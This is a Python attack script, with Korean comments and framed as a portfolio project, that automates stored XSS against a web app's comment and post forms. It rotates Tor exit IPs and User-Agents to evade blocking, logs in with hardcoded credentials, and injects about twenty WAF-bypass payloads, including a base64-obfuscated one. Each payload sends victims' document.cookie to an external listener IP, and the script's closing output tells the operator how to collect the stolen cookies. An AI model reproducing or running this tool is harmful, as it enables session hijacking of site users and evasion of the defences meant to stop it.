#!/usr/bin/env python3
"""
Stealthy XSS Attack - IP 변경 + WAF 우회
포트폴리오 목적: 은밀한 XSS 공격 (Tor IP 자동 변경)
"""

import requests
import time
import sys
import random
from new_payloads import NewPayloadGenerator
import urllib3
import socket
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 색상
class Colors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    END = '\033[0m'
    BOLD = '\033[1m'

class TorController:
    """Tor IP 변경 컨트롤러"""

    def __init__(self, control_port=9051, control_password=None):
        self.control_port = control_port
        self.control_password = control_password

    def renew_ip(self):
        """Tor IP 갱신 (새로운 circuit)"""
        try:
            # Tor control port에 연결
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect(('127.0.0.1', self.control_port))

                # 인증 (비밀번호가 있으면)
                if self.control_password:
                    s.send(f'AUTHENTICATE "{self.control_password}"\r\n'.encode())
                else:
                    s.send(b'AUTHENTICATE\r\n')

                response = s.recv(1024).decode()

                if '250 OK' not in response:
                    # 인증 실패 시 빈 인증 시도
                    s.send(b'AUTHENTICATE ""\r\n')
                    response = s.recv(1024).decode()

                # IP 변경 명령
                s.send(b'SIGNAL NEWNYM\r\n')
                response = s.recv(1024).decode()

                if '250 OK' in response:
                    print(f"{Colors.CYAN}   🔄 Tor IP 변경 성공!{Colors.END}")
                    time.sleep(3)  # IP 변경 대기
                    return True
                else:
                    print(f"{Colors.YELLOW}   ⚠ Tor IP 변경 실패: {response}{Colors.END}")
                    return False

        except Exception as e:
            print(f"{Colors.YELLOW}   ⚠ Tor 제어 실패: {e}{Colors.END}")
            print(f"{Colors.YELLOW}   → Tor control port가 활성화되어 있는지 확인하세요{Colors.END}")
            return False

    def get_current_ip(self, session):
        """현재 Tor IP 확인"""
        try:
            response = session.get('https://api.ipify.org?format=json', timeout=10)
            ip = response.json().get('ip', 'Unknown')
            return ip
        except:
            return 'Unknown'

class StealthyXSSAttacker:
    """은밀한 XSS 공격 (IP 변경 + WAF 우회)"""

    def __init__(self, base_url, listener_url, username='alice', password='alice2024', use_tor=True, use_ip_rotation=True):
        self.base_url = base_url
        self.listener_url = listener_url
        self.username = username
        self.password = password
        self.use_tor = use_tor
        self.use_ip_rotation = use_ip_rotation
        self.tor_controller = TorController() if use_ip_rotation else None

        # User-Agent 풀 (세션 생성 전에 정의)
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        ]

        self.session = None
        self._create_session()

    def _create_session(self):
        """새로운 세션 생성"""
        self.session = requests.Session()

        if self.use_tor:
            self.session.proxies = {
                'http': 'socks5h://127.0.0.1:9050',
                'https': 'socks5h://127.0.0.1:9050'
            }

        # 랜덤 User-Agent
        ua = random.choice(self.user_agents)

        self.session.headers.update({
            'User-Agent': ua,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9,ko;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'DNT': '1',
        })

        # 재시도 설정
        adapter = requests.adapters.HTTPAdapter(max_retries=2)
        self.session.mount('http://', adapter)
        self.session.mount('https://', adapter)

    def change_ip(self):
        """IP 변경 및 세션 재생성"""
        if not self.use_ip_rotation:
            print(f"{Colors.YELLOW}[*] IP 변경 비활성화 (Tor 프록시만 사용){Colors.END}\n")
            return

        print(f"{Colors.CYAN}[*] IP 변경 중...{Colors.END}")

        old_ip = self.tor_controller.get_current_ip(self.session)
        print(f"   Old IP: {old_ip}")

        # Tor IP 갱신
        self.tor_controller.renew_ip()

        # 새 세션 생성
        self._create_session()

        new_ip = self.tor_controller.get_current_ip(self.session)
        print(f"   New IP: {new_ip}")

        if old_ip != new_ip:
            print(f"{Colors.GREEN}   ✓ IP 변경 완료!{Colors.END}\n")
        else:
            print(f"{Colors.YELLOW}   ⚠ IP가 변경되지 않았습니다. 계속 진행...{Colors.END}\n")

        time.sleep(2)

    def login(self):
        """로그인"""
        print(f"{Colors.BLUE}[*] 로그인 시도: {self.username}{Colors.END}")

        url = f"{self.base_url}/login.php"

        try:
            # 원본 스크립트처럼 단순하게
            data = {'username': self.username, 'password': self.password}

            response = self.session.post(
                url,
                data=data,
                allow_redirects=True,
                timeout=15
            )

            if 'index.php' in response.url or response.status_code == 200:
                print(f"{Colors.GREEN}✓ 로그인 성공!{Colors.END}\n")
                return True
            else:
                print(f"{Colors.RED}✗ 로그인 실패{Colors.END}\n")
                return False

        except Exception as e:
            print(f"{Colors.RED}✗ 로그인 오류: {e}{Colors.END}\n")
            return False

    def post_comment(self, post_id, payload):
        """댓글 작성 (은밀하게)"""
        print(f"{Colors.YELLOW}[*] 댓글 작성 중... (Post ID: {post_id}){Colors.END}")
        print(f"   Payload: {payload[:80]}{'...' if len(payload) > 80 else ''}")

        url = f"{self.base_url}/add_comment.php"
        data = {'post_id': post_id, 'content': payload}

        try:
            # 원본 스크립트처럼 단순하게 (WAF 우회)
            response = self.session.post(
                url,
                data=data,
                allow_redirects=True,
                timeout=15
            )

            if response.status_code == 403:
                print(f"{Colors.RED}✗ 403 Forbidden - IP 차단됨{Colors.END}\n")
                return False
            elif 'index.php' in response.url or response.status_code == 200:
                print(f"{Colors.GREEN}✓ 댓글 작성 성공!{Colors.END}\n")
                return True
            else:
                print(f"{Colors.RED}✗ 실패 (상태: {response.status_code}){Colors.END}\n")
                return False

        except Exception as e:
            print(f"{Colors.RED}✗ 오류: {e}{Colors.END}\n")
            return False

    def post_new_post(self, payload):
        """게시물 작성 (은밀하게)"""
        print(f"{Colors.YELLOW}[*] 게시물 작성 중...{Colors.END}")
        print(f"   Payload: {payload[:80]}{'...' if len(payload) > 80 else ''}")

        url = f"{self.base_url}/new_post.php"
        data = {'content': payload}

        try:
            # 원본 스크립트처럼 단순하게 (WAF 우회)
            response = self.session.post(
                url,
                data=data,
                allow_redirects=True,
                timeout=15
            )

            if response.status_code == 403:
                print(f"{Colors.RED}✗ 403 Forbidden - IP 차단됨{Colors.END}\n")
                return False
            elif 'index.php' in response.url or response.status_code == 200:
                print(f"{Colors.GREEN}✓ 게시물 작성 성공!{Colors.END}\n")
                return True
            elif '허용되지 않은' in response.text:
                print(f"{Colors.RED}✗ 차단됨: 허용되지 않은 태그{Colors.END}\n")
                return False
            else:
                print(f"{Colors.RED}✗ 실패{Colors.END}\n")
                return False

        except Exception as e:
            print(f"{Colors.RED}✗ 오류: {e}{Colors.END}\n")
            return False

def main():
    import argparse

    parser = argparse.ArgumentParser(description='Stealthy XSS Attack with IP rotation')
    parser.add_argument('--target', default='http://3.34.90.201', help='Target URL')
    parser.add_argument('--listener', default='http://3.113.201.239:9999/steal', help='Listener URL')
    parser.add_argument('--user', default='alice', help='Username')
    parser.add_argument('--password', default='alice2024', help='Password')
    parser.add_argument('--no-tor', action='store_true', help='Disable Tor')
    parser.add_argument('--no-ip-rotation', action='store_true', help='Disable IP rotation (Tor Control Port 불필요)')
    parser.add_argument('--delay', type=int, default=5, help='Delay between attempts (seconds)')
    args = parser.parse_args()

    print(f"\n{Colors.BOLD}{Colors.PURPLE}{'='*80}{Colors.END}")
    print(f"{Colors.BOLD}{Colors.PURPLE}🕵️  Stealthy XSS Attack (IP Rotation + WAF Bypass){Colors.END}")
    print(f"{Colors.BOLD}{Colors.PURPLE}{'='*80}{Colors.END}\n")

    BASE_URL = args.target
    LISTENER_URL = args.listener
    USE_TOR = not args.no_tor
    USE_IP_ROTATION = not args.no_ip_rotation
    DELAY = args.delay

    print(f"{Colors.BLUE}📡 Target: {BASE_URL}{Colors.END}")
    print(f"{Colors.BLUE}📡 Listener: {LISTENER_URL}{Colors.END}")

    if USE_TOR:
        if USE_IP_ROTATION:
            print(f"{Colors.BLUE}🕵️  Tor: Enabled (with IP rotation){Colors.END}")
        else:
            print(f"{Colors.BLUE}🕵️  Tor: Enabled (NO IP rotation - Control Port 불필요){Colors.END}")
    else:
        print(f"{Colors.BLUE}🕵️  Tor: Disabled{Colors.END}")

    print(f"{Colors.BLUE}⏱️  Delay: {DELAY}s{Colors.END}\n")

    # 공격자 인스턴스
    attacker = StealthyXSSAttacker(BASE_URL, LISTENER_URL, args.user, args.password, USE_TOR, USE_IP_ROTATION)

    # 페이로드 - 훨씬 더 다양하게
    gen = NewPayloadGenerator(LISTENER_URL)

    comment_payloads = [
        # 기본 fetch 방식
        f'<img/src=x/onerror=fetch("{LISTENER_URL}?c="+document.cookie)>',
        f'<img/src=x/onerror=fetch("{LISTENER_URL}?c="+document.cookie)/>',

        # new Image 방식
        f'<img/src=x/onerror=new(Image).src="{LISTENER_URL}?c="+document.cookie>',
        f'<img/src=x/onerror=new\\x20Image().src="{LISTENER_URL}?c="+document.cookie>',

        # location 리다이렉트
        f'<img/src=x/onerror=location="{LISTENER_URL}?c="+document.cookie>',
        f'<img/src=x/onerror=window.location="{LISTENER_URL}?c="+document.cookie>',

        # details 태그
        f'<details/open/ontoggle=fetch("{LISTENER_URL}?c="+document.cookie)>',
        f'<details/ontoggle=fetch("{LISTENER_URL}?c="+document.cookie)/open>',

        # input autofocus
        f'<input/onfocus=fetch("{LISTENER_URL}?c="+document.cookie)/autofocus>',
        f'<input/autofocus/onfocus=fetch("{LISTENER_URL}?c="+document.cookie)>',

        # body 태그
        f'<body/onload=fetch("{LISTENER_URL}?c="+document.cookie)>',

        # video/audio
        f'<video/src/onerror=fetch("{LISTENER_URL}?c="+document.cookie)>',
        f'<audio/src/onerror=fetch("{LISTENER_URL}?c="+document.cookie)>',

        # 탭/줄바꿈 구분자
        f'<img\\tsrc=x\\tonerror=fetch("{LISTENER_URL}?c="+document.cookie)>',
        f'<img\\nsrc=x\\nonerror=fetch("{LISTENER_URL}?c="+document.cookie)>',

        # Base64 난독화
        f'<img/src=x/onerror=eval(atob("ZmV0Y2goImh0dHA6Ly8zLjExMy4yMDEuMjM5Ojk5OTkvc3RlYWw/Yz0iK2RvY3VtZW50LmNvb2tpZSk="))>',

        # navigator.sendBeacon
        f'<img/src=x/onerror=navigator.sendBeacon("{LISTENER_URL}",document.cookie)>',

        # XMLHttpRequest
        f'<img/src=x/onerror=with(new\\x20XMLHttpRequest)open("GET","{LISTENER_URL}?c="+document.cookie),send()>',

        # iframe javascript:
        f'<iframe/src="javascript:fetch(\'{LISTENER_URL}?c=\'+document.cookie)">',

        # marquee
        f'<marquee/onstart=fetch("{LISTENER_URL}?c="+document.cookie)>',
    ]

    post_payloads = comment_payloads[:10]  # 게시물용도 동일한 페이로드 사용

    print(f"{Colors.BOLD}{'='*80}{Colors.END}")
    if USE_IP_ROTATION:
        print(f"{Colors.BOLD}공격 시작 (매 시도마다 IP 변경){Colors.END}")
    else:
        print(f"{Colors.BOLD}공격 시작 (IP 변경 없음){Colors.END}")
    print(f"{Colors.BOLD}{'='*80}{Colors.END}\n")

    success_count = 0

    # 댓글 XSS 공격 (IP 변경하며)
    print(f"{Colors.BOLD}📝 댓글 XSS 공격{Colors.END}\n")

    for idx, payload in enumerate(comment_payloads, 1):
        print(f"{Colors.PURPLE}{'='*80}{Colors.END}")
        print(f"{Colors.PURPLE}시도 {idx}/{len(comment_payloads)}{Colors.END}")
        print(f"{Colors.PURPLE}{'='*80}{Colors.END}\n")

        # IP 변경
        if USE_TOR and idx > 1:
            attacker.change_ip()

        # 로그인
        if not attacker.login():
            print(f"{Colors.YELLOW}⚠ 로그인 실패. 다음 시도...{Colors.END}\n")
            time.sleep(DELAY)
            continue

        # 댓글 작성
        if attacker.post_comment(1, payload):
            success_count += 1
            print(f"{Colors.GREEN}✓✓✓ 페이로드 주입 성공! ✓✓✓{Colors.END}\n")
            break

        # 실패 시 대기
        print(f"{Colors.YELLOW}⏱️  {DELAY}초 대기 후 다음 시도...{Colors.END}\n")
        time.sleep(DELAY)

    # 게시물 XSS 공격
    if success_count == 0:
        print(f"\n{Colors.BOLD}📄 게시물 XSS 공격{Colors.END}\n")

        for idx, payload in enumerate(post_payloads, 1):
            print(f"{Colors.PURPLE}{'='*80}{Colors.END}")
            print(f"{Colors.PURPLE}시도 {idx}/{len(post_payloads)}{Colors.END}")
            print(f"{Colors.PURPLE}{'='*80}{Colors.END}\n")

            # IP 변경
            if USE_TOR:
                attacker.change_ip()

            # 로그인
            if not attacker.login():
                print(f"{Colors.YELLOW}⚠ 로그인 실패. 다음 시도...{Colors.END}\n")
                time.sleep(DELAY)
                continue

            # 게시물 작성
            if attacker.post_new_post(payload):
                success_count += 1
                print(f"{Colors.GREEN}✓✓✓ 페이로드 주입 성공! ✓✓✓{Colors.END}\n")
                break

            time.sleep(DELAY)

    # 결과
    print(f"\n{Colors.BOLD}{'='*80}{Colors.END}")
    print(f"{Colors.BOLD}📊 공격 결과{Colors.END}")
    print(f"{Colors.BOLD}{'='*80}{Colors.END}\n")

    if success_count > 0:
        print(f"{Colors.GREEN}✓ 성공: {success_count}개 페이로드 주입{Colors.END}\n")
        print(f"{Colors.YELLOW}다음 단계:{Colors.END}")
        print(f"1. 피드 접속: http://{BASE_URL}/index.php")
        print(f"2. 서버 로그 확인: ssh ubuntu@3.113.201.239 'tail -f listener.log'")
        print(f"3. 쿠키 확인: cat stolen_cookies/cookie_*.json\n")
    else:
        print(f"{Colors.RED}✗ 모든 시도 실패{Colors.END}")
        print(f"{Colors.YELLOW}추천: --delay 값을 늘리거나 수동으로 시도하세요{Colors.END}\n")

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}⚠ 공격 중단됨{Colors.END}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.RED}❌ 오류: {e}{Colors.END}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
